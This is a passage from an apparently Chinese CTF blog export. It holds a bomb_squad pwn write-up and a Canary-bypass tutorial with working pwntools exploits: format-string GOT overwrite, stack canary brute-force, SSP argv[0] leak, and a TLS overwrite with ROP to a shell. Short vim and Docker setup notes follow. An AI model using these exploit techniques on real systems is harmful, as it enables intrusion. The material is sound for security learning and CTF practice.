将新函数地址偏移替换原函数地址偏移。 而上述程序也为类似主要流程如下： 分析安卓虚拟机为dalvik还是art，二者热补丁方式不一样。 解密解析补丁函数表(decryptAndParse) 执行补丁操作 接着在decryptAndParse中，对补丁表每字节+10，进行解密，解密后的补丁表： 1Lcom/example/originapplication/ProtectedClass;getEncrypttext(Ljava/lang/String;)Ljava/lang/String;1416140 后面这串数字就是新函数的位置。 这部分就是函数的字节码，但是IDA没有显示出来汇编，需要手动转换 不会 剩下的参考https://mypre.cn/2018/10/27/bfs-iscc-mobile PWN bomb_squad 首先checksec一下 123456[*] '/root/work/CLSknpNF3iWUuHCX.bomb_squad' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这个题目首先由4个小关卡，全部通关之后才能达到getflag的地方 12345678910111213int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); puts("Welcome to the bomb squad! Your first task: Diffuse this practice bomb."); phase_1(); puts("You got through phase 1 alright! Good work! But can you handle phase 2?"); phase_2(); puts("You could handle it! Good job... I think you can handle phase 3... right?"); phase_3(); puts("DAYUM, you got it! You know the drill, time for phase 4."); phase_4(); print_flag();&#125; phase_1 12345678910111213int phase_1()&#123; char *v0; // eax int result; // eax puts("Give me a number!"); v0 = get_line(); result = 3 * (2 * atoi(v0) / 37 - 18) - 1; if ( result != 1337 ) explode_bomb(); phase1_solved = 1; return result;&#125; 关卡1接收一个数字，经过一系列计算，使得最终结果要等于1337，使用z3-solver很容易得出解。 1561801642780 phase_2 123456789101112131415161718int phase_2()&#123; puts("Give me an array of numbers!"); s = get_line(); sscanf(s, "[%d, %d, %d, %d, %d, %d]", v4, _2C, _30, _34, _38, _3C); result = v4[0]; if ( v4[0] != 1 ) explode_bomb(); for ( i = 1; i &lt;= 5; ++i ) &#123; v2 = v4[i - 1] + v4[i]; result = func2(i); if ( v2 != result ) explode_bomb(); &#125; phase2_solved = 1; return result;&#125; 接收一个数组，要求满足a[0]=1，a[i-1]+a[i]=2^i，那么结果就是[1, 1, 3, 5, 11, 21] phase_2 123456789101112131415161718192021int phase_3()&#123; v4 = get_line(); v5 = "rqzzepiwMLepiwYsLYtpqpvzLsYeM"; while ( 1 ) &#123; v1 = v4++; result = (unsigned __int8)*v1; v3 = result; if ( !(_BYTE)result ) break; if ( (char)result &lt;= 96 || (char)result &gt; 123 ) explode_bomb(); v0 = v5++; if ( *v0 != keys[v3 - 97] ) explode_bomb(); lastentered = v3; &#125; phase3_solved = 1; return result;&#125; 接收一串字符串，要求keys里面的字符串要与v5的对应。但实际上不需要这么麻烦， 12if ( !(_BYTE)result ) break; 当输入为\x00时，就会跳出循环，直接返回。 phase_4 1234567891011121314151617181920int phase_4()&#123; s = (char *)get_line(); sscanf(s, "%d %d %d %d %d %d %d", v5, &amp;v5[1], &amp;v5[2], &amp;v5[3], &amp;v5[4], &amp;v5[5], &amp;v5[6]); v2 = &amp;n1; result = n1.num; v3 = n1.num; for ( i = 0; i &lt;= 6; ++i ) &#123; if ( v5[i] &lt; 0 || v5[i] &gt; 3 ) explode_bomb(); v2 = (node *)*((_DWORD *)&amp;v2-&gt;next1 + v5[i]); result = v2-&gt;num; v3 += result; &#125; if ( v3 != 95 ) explode_bomb(); phase4_solved = 1; return result;&#125; 这里n1是一个结构体，大致结构如下 12345678struct node&#123; node* next1; node* next2; node* next3; node* next4; char name[8]; int num;&#125;; 这一关接收用户输入的数字，根据数字来进行结构体之间num相加的顺序。 比如输入为"0 3"，相加的顺序就是0xa+0x7+0x10。 最后试出来解为3 0 3 0 3 0 0。 secret_phase 通关之后会进入print_flag，经过verify_working之后会打印出来flag 123456789void __noreturn print_flag()&#123; if ( verify_working() ) &#123; puts("Congratulations, you won! Here's the flag:"); system("cat flag.txt"); &#125; exit(1);&#125; 但是verify_working始终返回1的，而且最终也并没有得到flag，还是需要getshell。 进入secret_phase 123456789101112131415161718int secret_phase()&#123; puts("this is the secret phase.... please whisper, to keep it a seecret..."); v2 = &amp;n1; v3 = n2; v4 = &amp;n3; v5 = &amp;n4; v6 = &amp;n5; v7 = &amp;n6; for ( i = 0; i &lt;= 5; ++i ) &#123; printf("Rename node #%d to: ", i + 1); fgets((*(&amp;v2 + i))-&gt;name, 9, stdin); *(_BYTE *)strchrnul((*(&amp;v2 + i))-&gt;name, 10) = 0; putchar(10); &#125; return puts("Thanks, I was worried about having to come up with clever names myself!");&#125; 这一段代码是修改每一个node的name成员，最多只可以溢出一个字节到num上面，并没有什么用。 fini段 该section保存着进程终止代码指令。因此，当一个程序正常退出时，系统安排执行这个section的中的代码。 .fini_array中有一个__gg函数 1234567891011121314151617181920212223v5 = &amp;n1;v6 = n2;v7 = &amp;n3;v8 = &amp;n4;v9 = &amp;n5;v10 = &amp;n6;for ( i = 0; i &lt;= 5; ++i )&#123; v0 = alloca(32); v1 = *(&amp;v5 + i); v2 = (_DWORD *)(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4)); *v2 = *v1; v2[1] = v1[1]; v2[2] = v1[2]; v2[3] = v1[3]; v2[4] = v1[4]; v2[5] = v1[5]; v2[6] = v1[6]; result = *(_DWORD *)(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4) + 0x14); if ( result ) result = (*(int (**)(void))(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4) + 0x14))();&#125;return result; 经过分析之后发现这个函数会执行每个node中name[4]-name[8]所指向的函数，而name自然可以控制。并且call的时候，此时栈顶指向的就是当前node。那么只需要把某一个node的name后四个字节修改成system，next1指向的内容修改为/bin/sh\x00就可以getshell。 任意地址写 __nr函数： 123456789unsigned int _nr()&#123; v5 = __readgsdword(0x14u); v0 = (const char *)get_line(); strcpy(&amp;dest, v0); v1 = (const char *)get_line(); strcpy(v4, v1); return __readgsdword(0x14u) ^ v5;&#125; 很明显的栈溢出，可以通过第一个输入，将v4覆盖为node-&gt;next1的地址，通过第二个输入在修改next1所指向的内容。 payload 1234567891011121314151617from pwn import *p = process("./bomb_squad")p.sendline("8584")p.sendline("[1, 1, 3, 5, 11, 21]")p.sendline("\x00")p.sendline("3 0 3 0 3 0 0")system = 0x080485A0n3 = 0x804b0a8nr = 0x08048CDApayload = 'aaaa' + p32(nr) #首先利用__gg函数执行node1中的__nr函数p.send(payload)payload = 'bbbb' + p32(system) + "\n\n\n\n" #接着写入system地址到node2等待第二次call，最后4个\n跳过剩下4个node-&gt;name的修改p.send(payload) payload = 'a' * 0xfc + p32(n3) #栈溢出，修改n3-&gt;next1指向的内容p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() 之所以为什么是要修改n3-&gt;next1，因为system地址写入到了node2的name中，当__gg函数执行时，此时栈顶排列为 n3 n4 n5 n6 name num 接下来就要执行system函数，所以要修改n3指向的地址。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于vim的复制粘贴]]></title>
    <url>%2F2019%2F06%2F01%2Fvim%2F</url>
    <content type="text"><![CDATA[学习Canary相关的东西时，因为要从网上复制粘贴各种代码，因为缩进问题，复制完之后的效果惨不忍睹，比如这样： 过于惨不忍睹，markdown的代码框展现不出来效果 解决方法的话就是在粘贴前先输入:set paste，接着进入insert模式的时候后面就会多个(paste)，这样复制进去的就和你原本看到的一样了]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Canary原理以及绕过]]></title>
    <url>%2F2019%2F05%2F31%2Fcanary%2F</url>
    <content type="text"><![CDATA[Canary原理以及绕过 Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理 1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | Canary value | +-----------------+ | 局部变量 | Low | | Address 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 函数在fs:[0x28]取一个值，放入栈中，在函数结束前与fs:[0x28]进行异或，如果结果为0，Canary则未修改，不为0就是发生了缓冲区溢出。 12345;异或检查Canarymov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 而fs寄存器又指向了当前栈的TLS结构(TLS全称线程局部存储器，它用来保存变量或回调函数)，fs:[0x28]则指向了stack_guard。 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ...&#125; tcbhead_t; 如果可以溢出覆盖tls的话，就可以绕过Canary 如果Canary已被修改，程序会走到 __stack_chk_fail 1234567891011121314//eglibc-2.19/debug/stack_chk_fail.cvoid __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; Canary绕过 泄露Canary 漏洞代码： 1234567891011121314151617181920212223242526// ex2.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) &#123; system("/bin/sh");&#125;void init() &#123; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);&#125;void vuln() &#123; char buf[100]; for(int i=0;i&lt;2;i++)&#123; read(0, buf, 0x200); printf(buf); &#125;&#125;int main(void) &#123; init(); puts("Hello Hacker!"); vuln(); return 0;&#125; 编译为32位程序，开启Canary保护，关闭PIE： 1gcc -m32 -fstack-protector -no-pie ex2.c -o ex2 ida打开，在vuln处下断点，程序执行到这里时往栈上添加Canary。 12.text:565C5280 mov eax, large gs:14h.text:565C5286 mov [ebp+var_C], eax ;ebp+var_C=FF80175C 接着到read的位置 buf的位置在FF8016F8，Canary的位置在FF80175C，FF80175C-FF8016F8=0x64=100个字节 也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到Canary的低位字节。 Canary设计为以字节 \x00 结尾，本意是为了保证 Canary可以截断字符串，想要打印出Canary就只有覆盖低位字节 得到Canary值后接下来就是普通的rop了 123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom pwn import *context.binary = &apos;ex2&apos;#context.log_level = &apos;debug&apos;io = process(&apos;./ex2&apos;)get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]io.recvuntil(&quot;Hello Hacker!\n&quot;)# leak Canarypayload = &quot;A&quot;*100io.sendline(payload)io.recvuntil(&quot;A&quot;*100)Canary = u32(io.recv(4))-0xalog.info(&quot;Canary:&quot;+hex(Canary))# Bypass Canarypayload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)io.send(payload)io.recv()io.interactive() 爆破Canary pid_t fork( void); 返回值： 若成功调用一次则返回两个值，子进程返回0，父进程返回子进程ID；否则，出错返回-1 个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程（child process）。fork函数被调用一次但返回两次。两次返回的唯一区别是子进程中返回0值而父进程中返回子进程ID。 子进程是父进程的副本，它将获得父进程数据空间、堆、栈等资源的副本。注意，子进程持有的是上述存储空间的“副本”，这意味着父子进程间不共享这些存储空间。 利用fork就可以进行对Canary的爆破 ida: 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; __pid_t v3; // [esp+Ch] [ebp-Ch] init(); while ( 1 ) &#123; v3 = fork(); if ( v3 &lt; 0 ) break; //fork失败了就退出 if ( v3 ) &#123; wait(0); //父进程卡在这里 &#125; else &#123; puts("welcome"); //子进程执行漏洞 fun(); puts("recv sucess"); &#125; &#125; puts("fork error"); exit(0); 直接下断点调试的话是断在父进程里面，一直在wait()，可以先在fun()中的read()函数处下断点，接着去docker里面直接运行程序，从ida里面attach上去，此时里面有两个bin1，pid值较大的那一个就是子进程。 经过调试后，得知buf到Canary需要100字节，Canary到return地址需要12字节，编写exp: 1234567891011121314151617181920212223242526272829from pwn import *#context.log_level = 'debug'debug=1if debug: io=process("./bin1")else: io=remote("172.17.0.2",10001)canary='\x00'io.recvuntil("welcome\n")for i in range(3): for j in range(256): io.send('a'*100+canary+chr(j)) tmp=io.recvuntil("welcome\n") //输出recv success之后还会输出welcome，所以根据welcome判断，recvall()不知道为什么会卡住 if "recv" in tmp: canary+=chr(j) breakget_flag=0x0804863Bpayload='a'*100+canary+'a'*12+p32(get_flag)io.sendline(payload)print io.recvline() //recvall也会卡住 Stack-smashing Protection (SSP) 当Canary值比较不正确时，程序就会跳转到__stack_chk_fail， Libc 2.23 先看下__stack_chk_fail的源码： 12345678910// debug/stack_chk_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125; 其中调用了__fortify_fail 1234567891011121314// debug/fortify_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125;libc_hidden_def (__fortify_fail) __fortify_fail 调用__libc_message 打印错误信息和 argv[0] ,当输入的字符串长度足够长时，就可以覆盖到argv[0]，就可以通过报错泄露出信息。 pwn 32C3CTF2015 readme 1561905867614 第一次的输入也就是IO_gets()存在缓冲区溢出漏洞，而第二次的输入将覆盖flag 虽然flag被覆盖掉了，但是程序中还存在一个flag，这个就涉及到了linux系统中elf文件的映射 1234567gdb-peda$ b *0x0040080eBreakpoint 1 at 0x40080egdb-peda$ rgdb-peda$ vmmap readme.binStart End Perm Name0x00400000 0x00401000 r-xp /home/firmyy/readme.bin0x00600000 0x00601000 rw-p /home/firmyy/readme.bin 由此可以看出readme.bin被映射到到了两个地方，而只要在程序0x00000000~0x00001000内的数据，都会被映射到内存中，flag的位置在0x00000D20，也就是说flag也被映射到了0x00400D20和0x006000D20这两个内存地址当中，所以即使0x006000D20的被覆盖了，0x00400D20的也依旧存在。 由于要利用__stack_chk_fail泄露flag，需要找出argv[0]距离缓冲区的距离 gdb中直接在main函数处下断点： 1234567891011121314151617181920212223242526272829303132333435363738[----------------------------------registers-----------------------------------]RAX: 0x4006d0 (sub rsp,0x8)RBX: 0x0 RCX: 0x7ffff7fa9718 --&gt; 0x7ffff7faad80 --&gt; 0x0 RDX: 0x7fffffffe608 --&gt; 0x7fffffffe837 (&quot;SHELL=/bin/bash&quot;)RSI: 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;/root/readme.bin&quot;)RDI: 0x1 RBP: 0x4008b0 (push r15)RSP: 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;: mov edi,eax)RIP: 0x4006d0 (sub rsp,0x8)R8 : 0x7ffff7faad80 --&gt; 0x0 R9 : 0x7ffff7faad80 --&gt; 0x0 R10: 0xfffffffffffff46b R11: 0x7ffff7e11fb0 (&lt;__libc_start_main&gt;: push r14)R12: 0x4006ee (xor ebp,ebp)R13: 0x7fffffffe5f0 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x4006c0 &lt;_IO_gets@plt&gt;: jmp QWORD PTR [rip+0x20062a] # 0x600cf0 &lt;_IO_gets@got.plt&gt; 0x4006c6 &lt;_IO_gets@plt+6&gt;: push 0x9 0x4006cb &lt;_IO_gets@plt+11&gt;: jmp 0x400620=&gt; 0x4006d0: sub rsp,0x8 0x4006d4: mov rdi,QWORD PTR [rip+0x200665] # 0x600d40 &lt;stdout&gt; 0x4006db: xor esi,esi 0x4006dd: call 0x400660 &lt;setbuf@plt&gt; 0x4006e2: call 0x4007e0[------------------------------------stack-------------------------------------]0000| 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;: mov edi,eax)0008| 0x7fffffffe520 --&gt; 0x0 0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;/root/readme.bin&quot;)0024| 0x7fffffffe530 --&gt; 0x100000000 0032| 0x7fffffffe538 --&gt; 0x4006d0 (sub rsp,0x8)0040| 0x7fffffffe540 --&gt; 0x0 0048| 0x7fffffffe548 --&gt; 0x9266eaee5b02c2c9 0056| 0x7fffffffe550 --&gt; 0x4006ee (xor ebp,ebp)[------------------------------------------------------------------------------] 其中，0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 ("/root/readme.bin")就是argv[0]的地址了。 argv 是 argument vector的缩写，表示传入main函数的参数序列或指针，并且第一个参数argv[0]一定是程序的名称，并且包含了程序所在的完整路径 接下来运行到_IO_gets处，查看缓冲区的地址，计算得到要覆盖到argv[0]的话需要0x218个字节。 挂载程序： 1$ socat tcp4-listen:10001,reuseaddr,fork exec:./readme.bin,stderr payload: 12345678from pwn import *io = remote("172.17.0.2", 10001)payload_1 = "A"*0x218 + p64(0x400d20)io.sendline(payload_1)payload_2 = "A"*4io.sendline(payload_2)print io.recvall() 但是执行完payload后，执行的终端里没有打印出flag，而在服务器的终端中打印了出来 特别注意要控制LIBC_FATAL_STDERR_=1让fortify_fail能够把输出作为stderr给我们。否则fortify_fail下层接的是libc_message，而libc_message调用的是getenv。 getenv就是从environ指针那里去找环境变量指针数组。 getenv如果发现这环境变量没设置，libc_message会syscall调用open('/dev/tty')，输出你是看不到的。 https://bbs.pediy.com/thread-223664.htm 所以需要利用第二次的写入将LIBC_FATAL_STDERR_=1写入到环境变量中，这样自己的终端才可以接收到flag payload： 12345678910from pwn import *io = remote("172.17.0.2", 10001)payload_1 = "A"*0x218 + p64(0x400d20)+p64(0)+p64(0x600d20) #p64(0)是argv[0]指针与环境变量之间的隔断。 #p64(0x600d20)是第二次输出写入环境变量的指针io.sendline(payload_1)payload_2 = "LIBC_FATAL_STDERR_=1"io.sendline(payload_2)print io.recvall() Libc 2.25 然而在2.25中调用的函数有所改变 123456789//stack_chk_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail_abort (false, "stack smashing detected");&#125;strong_alias (__stack_chk_fail, __stack_chk_fail_local) 这里面调用了__fortify_fail_abort 而不是__fortify_fail 1234567891011121314151617181920212223242526extern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__fortify_fail_abort (_Bool need_backtrace, const char *msg)&#123; /* The loop is added only to keep gcc happy. Don't pass down __libc_argv[0] if we aren't doing backtrace since __libc_argv[0] may point to the corrupted stack. */ while (1) __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort, "*** %s ***: %s terminated\n", msg, (need_backtrace &amp;&amp; __libc_argv[0] != NULL ? __libc_argv[0] : "&lt;unknown&gt;"));&#125;void__attribute__ ((noreturn))__fortify_fail (const char *msg)&#123; __fortify_fail_abort (true, msg);&#125;libc_hidden_def (__fortify_fail)libc_hidden_def (__fortify_fail_abort) 函数 __fortify_fail_abort() 在第一个参数为 false 时不再进行栈回溯，直接以打印出字符串 &lt;unknown&gt; 结束，也就没有办法输出 argv[0] 了。 劫持__stack_chk_fail函数 Canary校验失败后会进入__stack_chk_fail函数中，__stack_chk_fail函数本身也是一个普通的延迟绑定函数，如果可以修改GOT表，就可以成功劫持到__stack_chk_fail函数。 题目代码： 123456789101112//mainint __cdecl main(int argc, const char **argv, const char **envp)&#123; char format; // [rsp+0h] [rbp-60h] unsigned __int64 v5; // [rsp+58h] [rbp-8h] v5 = __readfsqword(0x28u); init(*(_QWORD *)&amp;argc, argv, envp); read_n((__int64)&amp;format, 88u); printf(&amp;format, 88LL); return 0;&#125; 12345//backdoorint backdoor()&#123; return system("/bin/sh");&#125; main函数中存在格式化字符串漏洞，而程序本身自带一个后门。 checksec： 123456[*] '/root/ctf/canary/bin3/bin3' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 有Canary，不能直接覆盖return地址。但可以覆盖__stack_chk_fail地址来达到相同效果。 先计算出buff到canary的距离为88字节，接着构造payload。 123456789%78c%12$hhn %186c%13$hhn%56c%14$hhn%192c%15$hhnaa\x20\x10\x60\x00\x21\x10\x60\x00\x22\x10\x60\x00\x23\x10\x60\x00 因为程序是64位的，地址高位通常都有\x00，所以要放在后面，中间的两个字符'a'用来对齐。 payload: 123456789101112131415161718192021from pwn import *context.log_level='debug'context.arch='amd64'#p=process("./bin3")p=remote("172.17.0.2",10001)elf=ELF("./bin3")#raw_input()stack_chk_fail_got=elf.got['__stack_chk_fail']backdoor=0x40084Epayload="%78c%12$hhn%186c%13$hhn%56c%14$hhn%192c%15$hhnaa"payload+=p64(0x601020)payload+=p64(0x601021)payload+=p64(0x601022)payload+=p64(0x601023)print p.recv()p.sendline(payload+"a"*16) #构造好payload后还需要16个字节来覆盖Canary，触发__stack_chk_fail函数p.interactive() 覆盖TLS中的Canary 线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。这种对象的链接性（linkage）可以是静态的也可是外部的。 Canary在fs:0x28中，而fs寄存器指向的是当前栈的TLS结构，所以，当溢出字节足够多时，可以覆盖到Canary，达到绕过Canary的效果。 题目代码： StarCTF2018 babystack 123456789101112131415161718192021222324252627282930signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 result; // rax pthread_t newthread; // [rsp+0h] [rbp-10h] unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(byte_400C96); puts(" # # #### ##### ######"); puts(" # # # # # #"); puts("### ### # # #####"); puts(" # # # # #"); puts(" # # # # # #"); puts(" #### # #"); puts(byte_400C96); pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, 0LL); if ( pthread_join(newthread, 0LL) ) &#123; puts("exit failure"); result = 1LL; &#125; else &#123; puts("Bye bye"); result = 0LL; &#125; return result;&#125; 12345678910111213141516171819202122void *__fastcall start_routine(void *a1)&#123; unsigned __int64 size; // [rsp+8h] [rbp-1018h] char buf; // [rsp+10h] [rbp-1010h] unsigned __int64 v4; // [rsp+1018h] [rbp-8h] v4 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x1000uLL); puts("Welcome to babystack 2018!"); puts("How many bytes do you want to send?"); size = get_size(); if ( size &lt;= 0x10000 ) &#123; get_string(0, (__int64)&amp;buf, size); puts("It's time to say goodbye."); &#125; else &#123; puts("You are greedy!"); &#125; return 0LL;&#125; 程序可以接收0x10000个字节，显然足够覆盖到Canary了，但是程序中没有后门和system函数，所以需要自己构造gadgets来getshell。 首先要爆破出Canary的位置 123456789101112131415161718192021from pwn import *offset=0x1020while True: p = process('./bs') p.recvuntil("How many bytes do you want to send?") p.sendline(str(offset)) payload = '' payload += 'a'*0x1010 #buff payload += p64(0xdeadbeef) #ebp payload += p64(main_addr) #return payload += 'a'*(offset-len(payload)) #padding p.sendline(payload) temp = p.recvall() if "Welcome" in temp: p.close() print offset break else: offset += 1 p.close() 得到offset为6128。 但是测试的时候宿主机得到的offset为6224，而docker中得到的是6128，应该和系统版本有关。 P.S.：docker中查看系统版本不能使用uanme -a或者cat /proc/version，这样查到的是宿主机的版本，要使用cat /etc/issue。 接着可以构造payload，泄露出__libc_start_main的地址，利用libc-database查找libc版本。 123456789101112131415161718192021from pwn import *context.log_level="debug"offset=6128p=remote("172.17.0.2",10001)elf=ELF("./bs")pop_rdi_ret = 0x400c03libc_main_start = elf.got["__libc_start_main"]puts_plt = elf.symbols["puts"]p.recvuntil("How many bytes do you want to send?\n")p.sendline(str(offset))payload = ''payload += 'a'*0x1010payload += p64(0xdeadbeef)payload += p64(pop_rdi_ret)payload += p64(libc_main_start)payload += p64(puts_plt)payload += 'a'*(offset-len(payload))p.sendline(payload)print p.recv() libc-database： 1234root@kali:~/libc-database# ./find __libc_start_main 740ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)archive-glibc (id libc6_2.23-0ubuntu11_amd64)archive-glibc (id libc6_2.23-0ubuntu3_amd64) 接着使用./download libc6_2.23-0ubuntu10_amd64下载libc，并将其中的libc.so.6移动至题目同目录下，在payload中加载libc。 one_gadget查找可用的gadget 1234567891011121314150x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL 但是返回到gadget上面之后程序会报错，原因是atol函数会取fs:[eax]中的值，而这个地址为了覆盖Canary也被波及到了，所以需要在bss段中开辟一个新空间，并且将esp的地址覆盖为新空间的地址，这里就利用到了frame faking。 payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')#p = process('./bs')p=remote("172.17.0.2",10001)raw_input()elf = ELF("./bs")libc=ELF("./libc.so.6") main_addr = 0x4009E7offset = 6128bss_start = elf.bss()fakebuf = bss_start + 0x300pop_rdi_ret = 0x400c03pop_rsi_r15_ret = 0x400c01leave_ret = 0x400955puts_got = elf.got["puts"]puts_plt = elf.symbols["puts"]puts_libc = libc.symbols["puts"]read_plt = elf.symbols["read"]p.recvuntil("How many bytes do you want to send?")p.sendline(str(offset))payload = ''payload += 'a'*0x1010 payload += p64(fakebuf) #frame faking之后的新esppayload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(pop_rdi_ret)payload += p64(0)payload += p64(pop_rsi_r15_ret)payload += p64(fakebuf)payload += p64(0x0) #填充一个无意义的值给r15payload += p64(read_plt) #将one_gadget写入bss中payload += p64(leave_ret)payload += 'a'*(offset - len(payload))p.send(payload)p.recvuntil("It's time to say goodbye.\n")puts_addr = u64(p.recv()[:6].ljust(8,'\x00'))print hex(puts_addr)getshell_libc = 0xf02a4base_addr = puts_addr - puts_libcone_gadget = base_addr + getshell_libcpayload = ''payload += p64(0xdeadbeef)payload += p64(one_gadget)p.send(payload)p.interactive() BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。 BSS 段“存放”的是未初始化的全局变量与局部静态变量，此处指的存放是指为其预留空间（占位符）。但BSS段在磁盘上不是真的占用变量大小的空间，它仅是在该段中记录了所有未初始化全局变量与局部静态变量的大小总和，至于每个变量的大小则存储在符号表的size属性中。即： BSS段内容：无内容，它将在段表中占一个段描述符，该段描述符的size属性将记录未初始化的全局变量与局部静态变量的大小总和。 每个未初始化全局对象与静态对象的大小：存储在符号表的 size 属性中。 并且由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建环境]]></title>
    <url>%2F2019%2F05%2F30%2F%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[kali配置 安装docker 正常情况下用docker官方的文档安装就行，但是执行到下面这条命令时会报错 1234$ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 错误： 1aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Kali/n/a 具体原因是什么至今也没查到，可能是和kali版本有关系吧 解决方法： 自己添加源就可以了 1deb https://mirrors.aliyun.com/docker-ce/linux/debian wheezy stable 安装成功后执行systemctl enable docker使docker开机自启。 再找一个合适的环境pull下，找了半天发现pwnbox不错，有一个run.sh可以快捷启动环境，但是没有ida调试文件和没有端口映射，自己改了改文件之后就好用多了。 run.sh: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env bash# Run superkojiman/pwnbox container in docker.# Store your .gdbinit, .radare2rc, .vimrc, etc in a ./rc directory. The contents will be copied to# /root/ in the container.ESC="\x1B["RESET=$ESC"39m"RED=$ESC"31m"GREEN=$ESC"32m"BLUE=$ESC"34m"if [[ -z $&#123;1&#125; ]]; then echo -e "$&#123;RED&#125;Missing argument CTF name.$&#123;RESET&#125;" exit 0fictf_name=$&#123;1&#125;# Create docker container and run in the background# Add this if you need to modify anything in /proc: --privileged docker run -it \ -h $&#123;ctf_name&#125; \ -d \ -p 23946:23946 \ --security-opt seccomp:unconfined \ --name $&#123;ctf_name&#125; \ superkojiman/pwnbox# Tar config files in rc and extract it into the containerif [[ -d rc ]]; then cd rc if [[ -f rc.tar ]]; then rm -f rc.tar fi for i in .*; do if [[ ! $&#123;i&#125; == "." &amp;&amp; ! $&#123;i&#125; == ".." ]]; then tar rf rc.tar $&#123;i&#125; fi done cd - &gt; /dev/null 2&gt;&amp;1 cat rc/rc.tar | docker cp - $&#123;ctf_name&#125;:/root/ rm -f rc/rc.tarelse echo -e "$&#123;RED&#125;No rc directory found. Nothing to copy to container.$&#123;RESET&#125;"fi# Create stop/rm script for containercat &lt;&lt; EOF &gt; $&#123;ctf_name&#125;-stop.sh#!/bin/bashdocker stop $&#123;ctf_name&#125;docker rm $&#123;ctf_name&#125;rm -f 